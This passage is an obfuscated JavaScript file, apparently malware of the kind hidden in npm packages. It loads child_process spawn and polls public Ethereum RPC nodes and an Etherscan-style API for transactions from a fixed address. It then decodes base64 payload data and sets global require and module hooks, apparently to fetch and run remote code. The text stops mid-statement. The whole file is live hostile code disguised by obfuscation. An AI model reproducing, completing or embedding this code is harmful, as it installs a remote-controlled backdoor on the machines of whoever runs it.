_0x39c7b3=['6f0121063e','Mozilla/5.','vsVto','BoIAd','GGFaB','ZFXMR','createInfl','cpUBI','forEach','m\x27]=module','ogLQR','subarray','blockNumbe','ciBJl','adPes','protocol','concat','MpDag','POST','_t_u','HDeaX','gEJkK','dKrGP','nLoVU','mjtii','vNrQY','deflate','AfJYB','address=','h.blocksco','0\x20(Windows',':80','3dYSGnS','LLEgr','xQSGI','CrnBu','qgnZE','zGBfJ','kbQjv','pZMEw','qemQD','createBrot','transactio','vwdIJ','TXebJ','x-payload-','count&acti','@^1aQk','PjPYE','EZzyY','url','D311D3080e','YGLIZ','ort=desc&f','message','358050hwnFuR','AOtnf','ignore','parse','WpXmE','write','ngth','TyIju','RzAXc','IKYUV','https:','387614fZWVKW','HJqhJ','empty','ufTsk','public.bla','vqInx','al=global;','gzip,\x20defl','GET','MOgkU','WPcMg','object','iqldi','HnEZv','ate','dDnil','fUFYG','XTkSG','kWFLB','get','RvLqJ','end','_H2','k=0&endblo',':443/0x/ls','hostname','ZTPpt','Win64;\x20x64','\x20NT\x2010.0;\x20','find','jPatL','Content-Ty','LYlST','eth_blockN','nQWSp','h.drpc.org','min','znPEY','all','no\x20b64','YCwLH','HEAD','IuWMG','IHMbk','hex','unt','charCodeAt','createGunz','XHKVp','&startbloc','nsactionCo','b64','stener','yRNZh','toLowerCas','hRSlZ','zlib','BIPpD','GZprP','hbbcU','.publicnod','eAreG','addEventLi','ddLbY','QyUBw','zAaGd','controller','GijDO','http://','cqZwT','ltPrj','headers','replace','n/json','\x27]=\x27','\x20Chrome/13','findIndex','eth_getTra','then','1.0.0.0\x20Sa','dOirH','result','VPsCE','2140572okvLtT','HPlEi','\x20(KHTML,\x20l','port','node','mxSNT','_t_s','on=txlist&','UVEAg','qtOhP','rvxhG','request','nonce','length','239230QsjoHT','EaMTQ','ElRXP','jjkCJ','qIYQS','3142632rNhiot','CHHhn','map','gifQu','19450AaPRji','h-mainnet.','e;global[\x27','CvEVD','xLMUX','data',')\x20AppleWeb','TntTy','9&page=1&o','signal','trim','gzip','sXOTv','NtNzV','Kit/537.36',',Sr3=@','r\x27]=requir','qKDlv','ckByNumber','gTnGB','zqYUk','global[\x27_V','byteLength','NfmdB','KUERx','from','CTNeq','ffset=20&s','base64','9aDC2490Ef','umber','dDjhb','yAWhH','q4FZkxX{!h','kFQGW','UwWrS','Agent','liDecompre','MLIOR','QZkrC','unref','push','hereum-rpc','mujFt','cXZbP','288lMtxAE','https','icJKY','search','LpuXg','PWlzd','pathname','fari/537.3','keep-alive','http','516mdBpUb','hxvkS','Wtnxs','oYnfv','IYVLW','applicatio','rgeuf',':443','pc.io/eth','BbcMI','QpeUN','850060GppvvN','LUHgk','fRChS','YwJRh','iorSY','OwQBz','stapi.io','FJQfU','cijQU','run','content-en','ut.com/api','HEGYP','?module=ac','coding','XrINm','https://1r','pipe','ike\x20Gecko)','x-gzip','resolve',';var\x20_glob','\x27;global[\x27','UoHre','statusCode','eth_getBlo','child_proc','slice','utf8','qwuMv','ess','ck=9999999','finally','y-p_>d$0B&',':443/0x/cl','abort','DXTAq','catch','filter','qFrln','kNlIn','error','QqrEg','e.com','https://et','auues','stringify','WomQT','dHJMG','any','2.0','Content-Le','0xa322E5f3','pBine','SSlTl','qmymj','ate,\x20br','toString','HmRMA','uFaIV','jBzcJ','ilterby=fr','isArray','resume','drGLd'];_0x240a=function(){return _0x39c7b3;};return _0x240a();}const http=require(_0xb40cd9(0x20e)),https=require(_0xb40cd9(0x206)),zlib=require(_0xb40cd9(0x2d5)),{URL}=require(_0xb40cd9(0x28d)),{spawn}=require(_0xb40cd9(0x234)+_0xb40cd9(0x238)),B=0x3e8n,S=(_0xb40cd9(0x24e)+_0xb40cd9(0x28e)+_0xb40cd9(0x25b)+_0xb40cd9(0x1f5)+'1a')[_0xb40cd9(0x2d3)+'e'](),I=_0xb40cd9(0x246)+_0xb40cd9(0x278)+_0xb40cd9(0x225),R=[...new Set([process.env.ETH_RPC_URL,_0xb40cd9(0x22a)+_0xb40cd9(0x217),_0xb40cd9(0x246)+_0xb40cd9(0x2c0),_0xb40cd9(0x246)+_0xb40cd9(0x202)+_0xb40cd9(0x2d9)+_0xb40cd9(0x245),_0xb40cd9(0x246)+_0xb40cd9(0x308)+_0xb40cd9(0x2a1)+_0xb40cd9(0x220)][_0xb40cd9(0x240)](Boolean))],O={'keepAlive':!(0x15d3+0x1*-0xe06+-0x7cd),'keepAliveMsecs':0x7530,'maxSockets':0x40},A={'http:':new http[(_0xb40cd9(0x1fc))](O),'\u0068\u0074\u0074\u0070\u0073\u003A':new https[(_0xb40cd9(0x1fc))](O)};function ds(_0x39ab38){const _0xfcda3f=_0xb40cd9,_0x115e7b={'zqYUk':_0xfcda3f(0x224)+_0xfcda3f(0x228),'QqrEg':function(_0x4f8bd5,_0x3fcdba){return _0x4f8bd5===_0x3fcdba;},'nLoVU':_0xfcda3f(0x312),'CTNeq':function(_0x13a115,_0x3cdb85){return _0x13a115===_0x3cdb85;},'ltPrj':_0xfcda3f(0x22d),'qmymj':_0xfcda3f(0x275),'CHHhn':function(_0x28e8c6){return _0x28e8c6();}},_0x20b369=(_0x39ab38[_0xfcda3f(0x2e4)][_0x115e7b[_0xfcda3f(0x31b)]]||'')[_0xfcda3f(0x2d3)+'e'](),_0x3c5468=_0x115e7b[_0xfcda3f(0x244)](_0x20b369,_0x115e7b[_0xfcda3f(0x272)])||_0x115e7b[_0xfcda3f(0x1f2)](_0x20b369,_0x115e7b[_0xfcda3f(0x2e3)])?zlib[_0xfcda3f(0x2cc)+'ip']:_0x115e7b[_0xfcda3f(0x244)](_0x20b369,_0x115e7b[_0xfcda3f(0x251)])?zlib[_0xfcda3f(0x261)+_0xfcda3f(0x2ab)]:_0x115e7b[_0xfcda3f(0x244)](_0x20b369,'br')?zlib[_0xfcda3f(0x284)+_0xfcda3f(0x1fd)+'ss']:-0x61*0xc+0x13d2+0xa*-0x187;return _0x3c5468?_0x39ab38[_0xfcda3f(0x22b)](_0x115e7b[_0xfcda3f(0x304)](_0x3c5468)):_0x39ab38;}function hr(_0x15b32d,{method:_0x51d16f=_0xb40cd9(0x2a5),body:_0x2accb0,signal:_0x384d3d}={}){const _0x568f35=_0xb40cd9,_0x1e2195={'YCwLH':_0x568f35(0x236),'EaMTQ':function(_0x169ee6,_0x4c6af9){return _0x169ee6<_0x4c6af9;},'TntTy':function(_0x3b15be,_0x2a5726){return _0x3b15be>=_0x2a5726;},'cqZwT':function(_0x1425f2,_0x34ddad){return _0x1425f2(_0x34ddad);},'pZMEw':function(_0x470fe4,_0x30a5c5){return _0x470fe4===_0x30a5c5;},'hbbcU':function(_0x3fcd9f,_0x2867f9){return _0x3fcd9f!==_0x2867f9;},'LLEgr':function(_0x2eeb94,_0x503416){return _0x2eeb94!==_0x503416;},'gTnGB':function(_0x11db6d,_0x71fc2d){return _0x11db6d(_0x71fc2d);},'cpUBI':_0x568f35(0x30c),'gifQu':_0x568f35(0x2b2),'HDeaX':_0x568f35(0x243),'vqInx':function(_0x58db19,_0x215349){return _0x58db19===_0x215349;},'IuWMG':_0x568f35(0x29c),'TyIju':function(_0x3cfe2f,_0x4150a3){return _0x3cfe2f+_0x4150a3;},'EZzyY':function(_0x140c88,_0x9803bc){return _0x140c88!=_0x9803bc;},'rvxhG':function(_0x2e48fe,_0x2d4d8f){return _0x2e48fe===_0x2d4d8f;},'yAWhH':_0x568f35(0x214)+_0x568f35(0x2e6),'AOtnf':_0x568f35(0x2a4)+_0x568f35(0x252),'BIPpD':_0x568f35(0x20d),'ddLbY':_0x568f35(0x2bc)+'pe','dOirH':_0x568f35(0x24d)+_0x568f35(0x298)},_0x404917=new URL(_0x15b32d),_0x174790=_0x1e2195[_0x568f35(0x2fa)](_0x404917[_0x568f35(0x26a)],_0x1e2195[_0x568f35(0x2c7)])?https:http,_0x45e7e7={'Accept':_0x1e2195[_0x568f35(0x1f8)],'\u0041\u0063\u0063\u0065\u0070\u0074\u002D\u0045\u006E\u0063\u006F\u0064\u0069\u006E\u0067':_0x1e2195[_0x568f35(0x293)],'Connection':_0x1e2195[_0x568f35(0x2d6)]};return _0x1e2195[_0x568f35(0x28c)](_0x2accb0,null)&&(_0x45e7e7[_0x1e2195[_0x568f35(0x2dc)]]=_0x1e2195[_0x568f35(0x1f8)],_0x45e7e7[_0x1e2195[_0x568f35(0x2ed)]]=Buffer[_0x568f35(0x31d)](_0x2accb0)),new Promise((_0x4b4771,_0x22e71e)=>{const _0x5e5d50=_0x568f35,_0x47340b=_0x174790[_0x5e5d50(0x2fb)]({'hostname':_0x404917[_0x5e5d50(0x2b6)],'port':_0x404917[_0x5e5d50(0x2f3)]||(_0x1e2195[_0x5e5d50(0x2a2)](_0x404917[_0x5e5d50(0x26a)],_0x1e2195[_0x5e5d50(0x2c7)])?-0x21f*-0xd+0x2660+0x4*-0x100e:-0x1945*0x1+0x1be*0x11+-0x1*0x409),'path':_0x1e2195[_0x5e5d50(0x299)](_0x404917[_0x5e5d50(0x20b)],_0x404917[_0x5e5d50(0x208)]),'method':_0x51d16f,'agent':A[_0x404917[_0x5e5d50(0x26a)]],'signal':_0x384d3d,'headers':_0x45e7e7},_0x75fd6c=>{const _0x1b92c1=_0x5e5d50,_0x2fc6dc={'fRChS':_0x1e2195[_0x1b92c1(0x2c5)],'jjkCJ':function(_0x5d7d9a,_0x399640){const _0x56d064=_0x1b92c1;return _0x1e2195[_0x56d064(0x2ff)](_0x5d7d9a,_0x399640);},'eAreG':function(_0x536981,_0x4deb3a){const _0x148769=_0x1b92c1;return _0x1e2195[_0x148769(0x30e)](_0x536981,_0x4deb3a);},'vNrQY':function(_0x8ae994,_0x1f037b){const _0xf9db4d=_0x1b92c1;return _0x1e2195[_0xf9db4d(0x2e2)](_0x8ae994,_0x1f037b);},'UwWrS':function(_0x4f254d,_0x31ae03){const _0x36d8b4=_0x1b92c1;return _0x1e2195[_0x36d8b4(0x282)](_0x4f254d,_0x31ae03);},'QyUBw':function(_0x47b814,_0x470f5c){const _0x48e340=_0x1b92c1;return _0x1e2195[_0x48e340(0x2d8)](_0x47b814,_0x470f5c);},'SSlTl':function(_0x8917e,_0x499259){const _0xbdb768=_0x1b92c1;return _0x1e2195[_0xbdb768(0x27c)](_0x8917e,_0x499259);},'BoIAd':function(_0x190f94,_0x5530cd){const _0x1887e4=_0x1b92c1;return _0x1e2195[_0x1887e4(0x2e2)](_0x190f94,_0x5530cd);},'jBzcJ':function(_0x49a911,_0x47fdc7){const _0x3d6666=_0x1b92c1;return _0x1e2195[_0x3d6666(0x2e2)](_0x49a911,_0x47fdc7);}},_0x3fcf99=_0x1e2195[_0x1b92c1(0x31a)](ds,_0x75fd6c),_0x5ca0d0=[];_0x3fcf99['on'](_0x1e2195[_0x1b92c1(0x262)],_0x1987df=>_0x5ca0d0[_0x1b92c1(0x201)](_0x1987df)),_0x3fcf99['on'](_0x1e2195[_0x1b92c1(0x306)],()=>{const _0x2d6b70=_0x1b92c1,_0x42a3a0=Buffer[_0x2d6b70(0x26b)](_0x5ca0d0)[_0x2d6b70(0x253)](_0x2fc6dc[_0x2d6b70(0x21c)])[_0x2d6b70(0x311)]();if(_0x2fc6dc[_0x2d6b70(0x301)](_0x75fd6c[_0x2d6b70(0x232)],-0x1313+-0x39a+0x1775)||_0x2fc6dc[_0x2d6b70(0x2da)](_0x75fd6c[_0x2d6b70(0x232)],0x8b*0x19+-0x169*-0x1+-0xdd0))return _0x2fc6dc[_0x2d6b70(0x274)](_0x22e71e,new Error('H'+_0x75fd6c[_0x2d6b70(0x232)]+':'+_0x42a3a0[_0x2d6b70(0x235)](0xf9a*-0x2+0xbde+-0x1*-0x1356,0x1f34+0x10b2+-0x2f96*0x1)));if(!_0x42a3a0||_0x2fc6dc[_0x2d6b70(0x1fb)](_0x42a3a0[0x6b*0x26+-0xa91*-0x2+-0x2504],'\u003C')||_0x2fc6dc[_0x2d6b70(0x2dd)](_0x42a3a0[0x1a95*0x1+0x24d8+-0x3f6d],'\u007B')&&_0x2fc6dc[_0x2d6b70(0x250)](_0x42a3a0[0x3*0x7ea+-0x1*0xb1d+0xca1*-0x1],'\u005B'))return _0x2fc6dc[_0x2d6b70(0x274)](_0x22e71e,new Error('J:'+_0x42a3a0[_0x2d6b70(0x235)](0x1de7*0x1+-0x1*0x17d2+-0x615,-0x119*-0x17+-0x1*-0x1b2b+-0x341a)));try{_0x2fc6dc[_0x2d6b70(0x25e)](_0x4b4771,JSON[_0x2d6b70(0x295)](_0x42a3a0));}catch(_0x4e2a3e){_0x2fc6dc[_0x2d6b70(0x256)](_0x22e71e,new Error('P:'+_0x4e2a3e[_0x2d6b70(0x291)]));}}),_0x3fcf99['on'](_0x1e2195[_0x1b92c1(0x26f)],_0x22e71e);});_0x47340b['on'](_0x1e2195[_0x5e5d50(0x26f)],_0x22e71e),_0x1e2195[_0x5e5d50(0x28c)](_0x2accb0,null)&&_0x47340b[_0x5e5d50(0x297)](_0x2accb0),_0x47340b[_0x5e5d50(0x2b2)]();});}function wr(_0xdae5a1,_0x1ffa85){const _0x120294=_0xb40cd9,_0x28a344=R[_0x120294(0x305)](()=>new AbortController());return _0x1ffa85&&_0x28a344[_0x120294(0x263)](_0x2a81bc=>_0x1ffa85[_0x120294(0x2db)+_0x120294(0x2d1)](_0x120294(0x23d),()=>_0x2a81bc[_0x120294(0x23d)](),{'once':!(0x6f+-0x37b+0x30c)})),Promise[_0x120294(0x24b)](R[_0x120294(0x305)]((_0x5667be,_0x175b27)=>_0xdae5a1(_0x5667be,_0x28a344[_0x175b27][_0x120294(0x310)])))[_0x120294(0x23a)](()=>{const _0x13176b=_0x120294;for(const _0x1a8a97 of _0x28a344)_0x1a8a97[_0x13176b(0x23d)]();});}function rc(_0x5ed34b,_0x2eea57,_0x1fc2e7,_0x439a85){const _0x298f0d=_0xb40cd9,_0x50c6e6={'kbQjv':function(_0x3f146c,_0x57989a,_0x1c2612){return _0x3f146c(_0x57989a,_0x1c2612);},'QZkrC':_0x298f0d(0x26d),'dDjhb':_0x298f0d(0x24c)};return _0x50c6e6[_0x298f0d(0x281)](hr,_0x5ed34b,{'method':_0x50c6e6[_0x298f0d(0x1ff)],'body':JSON[_0x298f0d(0x248)]({'jsonrpc':_0x50c6e6[_0x298f0d(0x1f7)],'id':0x1,'method':_0x2eea57,'params':_0x1fc2e7}),'signal':_0x439a85})[_0x298f0d(0x2eb)](_0x571187=>_0x571187[_0x298f0d(0x2ee)]);}function rb(_0x5d97a3,_0x5aaa85,_0xac2837){const _0x146fa0=_0xb40cd9,_0x1b13cf={'GijDO':function(_0x4dac06,_0x5206c2,_0x2d5a8e){return _0x4dac06(_0x5206c2,_0x2d5a8e);},'vwdIJ':_0x146fa0(0x26d)};return _0x1b13cf[_0x146fa0(0x2e0)](hr,_0x5d97a3,{'method':_0x1b13cf[_0x146fa0(0x286)],'body':JSON[_0x146fa0(0x248)](_0x5aaa85[_0x146fa0(0x305)](([_0x319a5a,_0x463f95],_0x40edbd)=>({'jsonrpc':_0x146fa0(0x24c),'id':_0x40edbd+(-0x3b5+-0x238*-0x5+-0x762),'method':_0x319a5a,'params':_0x463f95}))),'signal':_0xac2837})[_0x146fa0(0x2eb)](_0x41776d=>{const _0x1b1c6e=_0x146fa0,_0xfb0a0e=new Map(_0x41776d[_0x1b1c6e(0x305)](_0xbb544=>[_0xbb544['id'],_0xbb544]));return _0x5aaa85[_0x1b1c6e(0x305)]((_0x56c092,_0x44cc79)=>_0xfb0a0e[_0x1b1c6e(0x2b0)](_0x44cc79+(-0xcd2+0x1696+-0x9c3))[_0x1b1c6e(0x2ee)]);});}const bh=_0xa1ee27=>'\u0030\u0078'+_0xa1ee27[_0xb40cd9(0x253)](0x1*-0xa75+-0x106b*-0x2+-0x1651);function fm(_0x2c8631){const _0x350c13={'iqldi':function(_0x2160b6,_0x160eea){return _0x2160b6(_0x160eea);},'vsVto':function(_0x5e2785,_0x1460b9){return _0x5e2785===_0x1460b9;}};return new Promise(_0x353c6d=>{const _0x2b71a6=_0x4963,_0x53c21b={'WomQT':function(_0xa0c91,_0x3dfd9a){const _0xf8f9b9=_0x4963;return _0x350c13[_0xf8f9b9(0x2a9)](_0xa0c91,_0x3dfd9a);},'iorSY':function(_0x5b11a2,_0x582adf){const _0x116cef=_0x4963;return _0x350c13[_0x116cef(0x25d)](_0x5b11a2,_0x582adf);}};let _0x3dbcac=_0x2c8631[_0x2b71a6(0x2fd)];if(!_0x3dbcac)return _0x350c13[_0x2b71a6(0x2a9)](_0x353c6d,null);let _0x3a9909=!(0x1*-0xb07+0x10*-0x24a+0x2fa8);const _0xf2ba06=_0x5ba021=>{const _0x28237f=_0x2b71a6;if(_0x3a9909)return;_0x3a9909=!(-0x1*-0x193e+-0x1*-0x2aa+-0x13*0x178);for(const _0x44fd18 of _0x2c8631)_0x44fd18[_0x28237f(0x2df)][_0x28237f(0x23d)]();_0x53c21b[_0x28237f(0x249)](_0x353c6d,_0x5ba021);};for(const _0x4e7b1b of _0x2c8631)_0x4e7b1b[_0x2b71a6(0x223)]()[_0x2b71a6(0x2eb)](_0x11e996=>{const _0x5d9f0c=_0x2b71a6;if(_0x3a9909)return;_0x11e996?_0x350c13[_0x5d9f0c(0x2a9)](_0xf2ba06,_0x11e996):_0x350c13[_0x5d9f0c(0x25d)](--_0x3dbcac,-0x1*0x267d+-0xf7f+0x2*0x1afe)&&_0x350c13[_0x5d9f0c(0x2a9)](_0x353c6d,null);})[_0x2b71a6(0x23f)](()=>{const _0x1daa1f=_0x2b71a6;!_0x3a9909&&_0x53c21b[_0x1daa1f(0x21e)](--_0x3dbcac,-0x721+0x1f71+-0x1850)&&_0x53c21b[_0x1daa1f(0x249)](_0x353c6d,null);});});}const cb=_0x14f92e=>[...new Set([_0x14f92e-0x1n,_0x14f92e,_0x14f92e+0x1n,_0x14f92e-B-0x1n,_0x14f92e-B,_0x14f92e-B+0x1n][_0xb40cd9(0x240)](_0x3f9c65=>_0x3f9c65>=0x0n))];function bt(_0x583786){const _0xb934c2=_0xb40cd9,_0x2f2dfc=new AbortController();return{'controller':_0x2f2dfc,'run':()=>wr((_0x1aaa26,_0x274697)=>rc(_0x1aaa26,_0xb934c2(0x233)+_0xb934c2(0x319),[bh(_0x583786),!(0xe60+0x9fa*-0x1+0x233*-0x2)],_0x274697),_0x2f2dfc[_0xb934c2(0x310)])[_0xb934c2(0x2eb)](_0x2e026b=>{const _0x4796b2=_0xb934c2,_0x19327b=_0x2e026b?.[_0x4796b2(0x285)+'ns'],_0x226be2=Array[_0x4796b2(0x258)](_0x19327b)?_0x19327b[_0x4796b2(0x2ba)](_0x2f5dcd=>_0x2f5dcd[_0x4796b2(0x1f1)]?.[_0x4796b2(0x2d3)+'e']()===S):null;return _0x226be2?{'blockNumber':_0x583786,'tx':_0x226be2}:null;})};}function na(_0x5d4e7e,_0x311943){const _0x2f856a=_0xb40cd9,_0x218abd={'rgeuf':function(_0x5750bc,_0x48057b,_0x41bb7a){return _0x5750bc(_0x48057b,_0x41bb7a);}},_0xe91a3d=_0x5d4e7e[_0x2f856a(0x305)](_0x445ac=>[_0x2f856a(0x2ea)+_0x2f856a(0x2cf)+_0x2f856a(0x2ca),[S,bh(_0x445ac)]]);return _0x218abd[_0x2f856a(0x215)](wr,(_0x5ef369,_0x2aac41)=>rb(_0x5ef369,_0xe91a3d,_0x2aac41),_0x311943)[_0x2f856a(0x2eb)](_0x214e15=>_0x214e15[_0x2f856a(0x305)](BigInt))[_0x2f856a(0x23f)](()=>Promise[_0x2f856a(0x2c3)](_0xe91a3d[_0x2f856a(0x305)](([_0x300860,_0x570c11])=>wr((_0x34edd5,_0x2761c0)=>rc(_0x34edd5,_0x300860,_0x570c11,_0x2761c0),_0x311943)))[_0x2f856a(0x2eb)](_0x3929a8=>_0x3929a8[_0x2f856a(0x305)](BigInt)));}function ls(_0x18ac7b){const _0x5b030a=_0xb40cd9,_0x3125f0={'cXZbP':function(_0x28fbe3,_0x2b48b3){return _0x28fbe3!==_0x2b48b3;},'HJqhJ':function(_0x2dcff8,_0x431ea0){return _0x2dcff8===_0x431ea0;},'KUERx':function(_0x14f7ff,_0x514558){return _0x14f7ff(_0x514558);},'yRNZh':function(_0x29e0f7,_0x4d6306){return _0x29e0f7<=_0x4d6306;},'sXOTv':function(_0x21b97c,_0x2500e0){return _0x21b97c(_0x2500e0);},'nQWSp':function(_0x3bafb2,_0x3de847){return _0x3bafb2===_0x3de847;},'WPcMg':function(_0xf9d74f,_0x474ddd){return _0xf9d74f-_0x474ddd;},'hRSlZ':function(_0x5b1887,_0x342cc9){return _0x5b1887>_0x342cc9;},'zAaGd':function(_0x4bb682){return _0x4bb682();},'CrnBu':function(_0x5b166c,_0x54d4f5){return _0x5b166c+_0x54d4f5;},'BbcMI':function(_0x377ec4,_0x57cdb3){return _0x377ec4/_0x57cdb3;},'VPsCE':function(_0x5a8365,_0x4eeac9){return _0x5a8365*_0x4eeac9;},'xQSGI':function(_0x300d62,_0x18425d,_0x3f731f){return _0x300d62(_0x18425d,_0x3f731f);},'MpDag':function(_0x526169,_0x3e0fcc){return _0x526169??_0x3e0fcc;}},_0x52a753=new AbortController(),_0x3fb63d=()=>_0x52a753[_0x5b030a(0x23d)]();return Promise[_0x5b030a(0x22e)](_0x3125f0[_0x5b030a(0x26c)](_0x18ac7b,null))[_0x5b030a(0x2eb)](_0x49c525=>_0x49c525!=null?_0x49c525:wr((_0x29a192,_0x4b0e40)=>rc(_0x29a192,_0x5b030a(0x2be)+_0x5b030a(0x1f6),[],_0x4b0e40),_0x52a753[_0x5b030a(0x310)])[_0x5b030a(0x2eb)](_0x49d97c=>BigInt(_0x49d97c)))[_0x5b030a(0x2eb)](_0x4a5be3=>wr((_0x506ed8,_0x64a48b)=>rc(_0x506ed8,_0x5b030a(0x2ea)+_0x5b030a(0x2cf)+_0x5b030a(0x2ca),[S,bh(_0x4a5be3)],_0x64a48b),_0x52a753[_0x5b030a(0x310)])[_0x5b030a(0x2eb)](_0x5ce6e9=>[_0x4a5be3,BigInt(_0x5ce6e9)]))[_0x5b030a(0x2eb)](([_0x128da9,_0xddf640])=>{const _0x2a41f9=_0x5b030a,_0x2980d3={'adPes':function(_0x31c266,_0x2a6dbd){const _0x37bdf2=_0x4963;return _0x3125f0[_0x37bdf2(0x2bf)](_0x31c266,_0x2a6dbd);},'kFQGW':function(_0x1a14df,_0x2b1e7d){const _0x587956=_0x4963;return _0x3125f0[_0x587956(0x2a7)](_0x1a14df,_0x2b1e7d);},'ElRXP':function(_0x4e2703,_0x51e9e8){const _0x42ce70=_0x4963;return _0x3125f0[_0x42ce70(0x2d4)](_0x4e2703,_0x51e9e8);},'XTkSG':function(_0x174bee){const _0x5eae16=_0x4963;return _0x3125f0[_0x5eae16(0x2de)](_0x174bee);},'qKDlv':function(_0x454723,_0x17a6be){const _0x146c2c=_0x4963;return _0x3125f0[_0x146c2c(0x1f0)](_0x454723,_0x17a6be);},'TXebJ':function(_0x7585b3,_0x23b90d){const _0x277c90=_0x4963;return _0x3125f0[_0x277c90(0x2d2)](_0x7585b3,_0x23b90d);},'mxSNT':function(_0x10cb80,_0x463bcd){const _0x37569d=_0x4963;return _0x3125f0[_0x37569d(0x27e)](_0x10cb80,_0x463bcd);},'qIYQS':function(_0x1b7be4,_0xf46076){const _0x2e266d=_0x4963;return _0x3125f0[_0x2e266d(0x218)](_0x1b7be4,_0xf46076);},'auues':function(_0x3efe57,_0x320684){const _0x18b06e=_0x4963;return _0x3125f0[_0x18b06e(0x2ef)](_0x3efe57,_0x320684);},'ufTsk':function(_0x1bf058,_0x6cd856){const _0x239b56=_0x4963;return _0x3125f0[_0x239b56(0x27e)](_0x1bf058,_0x6cd856);},'YwJRh':function(_0x1c5468,_0x1f9d5c,_0x5743f1){const _0xbf084f=_0x4963;return _0x3125f0[_0xbf084f(0x27d)](_0x1c5468,_0x1f9d5c,_0x5743f1);}},_0x1fd119=_0x3125f0[_0x2a41f9(0x2a7)](_0xddf640,0x1n);let _0x3595c1=-0x1n,_0x3a29eb=_0x128da9;const _0x50f36b=()=>_0x3a29eb-_0x3595c1<=0x1n?wr((_0x245c3d,_0x81a90c)=>rc(_0x245c3d,_0x2a41f9(0x233)+_0x2a41f9(0x319),[bh(_0x3a29eb),!(0x2062+0x1f3+-0x2255)],_0x81a90c),_0x52a753[_0x2a41f9(0x310)])[_0x2a41f9(0x2eb)](_0xc7148c=>{const _0x23cf5c=_0x2a41f9,_0x4404ae=_0xc7148c?.[_0x23cf5c(0x285)+'ns']||[];let _0x25476e=null;for(const _0x4f7d22 of _0x4404ae){if(_0x3125f0[_0x23cf5c(0x204)](_0x4f7d22[_0x23cf5c(0x1f1)]?.[_0x23cf5c(0x2d3)+'e'](),S))continue;if(_0x3125f0[_0x23cf5c(0x29e)](_0x3125f0[_0x23cf5c(0x1f0)](BigInt,_0x4f7d22[_0x23cf5c(0x2fc)]),_0x1fd119)){_0x25476e=_0x4f7d22;break;}_0x25476e&&_0x3125f0[_0x23cf5c(0x2d2)](_0x3125f0[_0x23cf5c(0x313)](BigInt,_0x4f7d22[_0x23cf5c(0x2fc)]),_0x3125f0[_0x23cf5c(0x313)](BigInt,_0x25476e[_0x23cf5c(0x2fc)]))||(_0x25476e=_0x4f7d22);}return{'blockNumber':_0x3a29eb,'tx':_0x25476e};}):(_0x18d906=>{const _0x34e2ed=_0x2a41f9,_0x55dcf5={'LpuXg':function(_0x43f0b4,_0x23e4a6){const _0x2a2086=_0x4963;return _0x2980d3[_0x2a2086(0x269)](_0x43f0b4,_0x23e4a6);},'oYnfv':function(_0x62f93f,_0x44f677){const _0x106baa=_0x4963;return _0x2980d3[_0x106baa(0x1fa)](_0x62f93f,_0x44f677);},'zGBfJ':function(_0x56c5de,_0x3f78f1){const _0xb2b7fe=_0x4963;return _0x2980d3[_0xb2b7fe(0x300)](_0x56c5de,_0x3f78f1);},'GGFaB':function(_0x28d871){const _0x56579e=_0x4963;return _0x2980d3[_0x56579e(0x2ae)](_0x28d871);}},_0x173697=_0x2980d3[_0x34e2ed(0x318)](BigInt,Math[_0x34e2ed(0x2c1)](0xf73+0x1908+-0x286f,_0x2980d3[_0x34e2ed(0x318)](Number,_0x18d906))),_0x149145=[];for(let _0x58efa4=0x1n;_0x2980d3[_0x34e2ed(0x287)](_0x58efa4,_0x173697);_0x58efa4+=0x1n)_0x149145[_0x34e2ed(0x201)](_0x2980d3[_0x34e2ed(0x2f5)](_0x3595c1,_0x2980d3[_0x34e2ed(0x302)](_0x2980d3[_0x34e2ed(0x247)](_0x58efa4,_0x2980d3[_0x34e2ed(0x1fa)](_0x3a29eb,_0x3595c1)),_0x2980d3[_0x34e2ed(0x2a0)](_0x173697,0x1n))));return _0x2980d3[_0x34e2ed(0x21d)](na,_0x149145,_0x52a753[_0x34e2ed(0x310)])[_0x34e2ed(0x2eb)](_0x3032ad=>{const _0xbbd997=_0x34e2ed,_0x2d527=_0x3032ad[_0xbbd997(0x2e9)](_0x40f294=>_0x40f294>=_0xddf640);return _0x55dcf5[_0xbbd997(0x209)](_0x2d527,-(0xc63+0x2*0xcc2+-0x25e6))?_0x3595c1=_0x149145[_0x55dcf5[_0xbbd997(0x212)](_0x149145[_0xbbd997(0x2fd)],-0x62*-0x36+-0x1*-0x1d9f+-0x324a)]:(_0x3a29eb=_0x149145[_0x2d527],_0x55dcf5[_0xbbd997(0x280)](_0x2d527,0x23f9+0x2392+-0x478b)&&(_0x3595c1=_0x149145[_0x55dcf5[_0xbbd997(0x212)](_0x2d527,0xbb6+-0x203b*-0x1+0x15f8*-0x2)])),_0x55dcf5[_0xbbd997(0x25f)](_0x50f36b);});})(_0x3a29eb-_0x3595c1-0x1n);return _0x3125f0[_0x2a41f9(0x2de)](_0x50f36b);})[_0x5b030a(0x23a)](_0x3fb63d);}function _0x4963(_0xfccef8,_0x19195d){_0xfccef8=_0xfccef8-(-0x1f39+-0x1be1*0x1+0x3d09);const _0x5a4a1f=_0x240a();let _0x5dde51=_0x5a4a1f[_0xfccef8];return _0x5dde51;}function li(){const _0x43231f=_0xb40cd9,_0x4f8cb7={'HmRMA':function(_0x1866e8,_0x355583){return _0x1866e8(_0x355583);}};return _0x4f8cb7[_0x43231f(0x254)](hr,I+(_0x43231f(0x227)+_0x43231f(0x289)+_0x43231f(0x2f7)+_0x43231f(0x277))+S+(_0x43231f(0x2ce)+_0x43231f(0x2b4)+_0x43231f(0x239)+_0x43231f(0x30f)+_0x43231f(0x1f3)+_0x43231f(0x290)+_0x43231f(0x257)+'om'))[_0x43231f(0x2eb)](_0x216a23=>{const _0x494ec9=_0x43231f,_0x16dfdc=Array[_0x494ec9(0x258)](_0x216a23?.[_0x494ec9(0x2ee)])?_0x216a23[_0x494ec9(0x2ee)]:[],_0x454aaa=_0x16dfdc[_0x494ec9(0x2ba)](_0x4221ff=>_0x4221ff[_0x494ec9(0x1f1)]?.[_0x494ec9(0x2d3)+'e']()===S);return{'blockNumber':_0x4f8cb7[_0x494ec9(0x254)](BigInt,_0x454aaa[_0x494ec9(0x267)+'r']),'tx':_0x454aaa};});}((async()=>{const _0x55377a=_0xb40cd9,_0x7fec65={'XrINm':function(_0x7c8c02,_0x4c4fc5){return _0x7c8c02<_0x4c4fc5;},'icJKY':function(_0x158793,_0x58c500){return _0x158793%_0x58c500;},'gEJkK':_0x55377a(0x236),'pBine':_0x55377a(0x243),'NtNzV':_0x55377a(0x288)+_0x55377a(0x2d0),'YGLIZ':_0x55377a(0x2c4),'dHJMG':function(_0x146e65,_0x2ed0b2){return 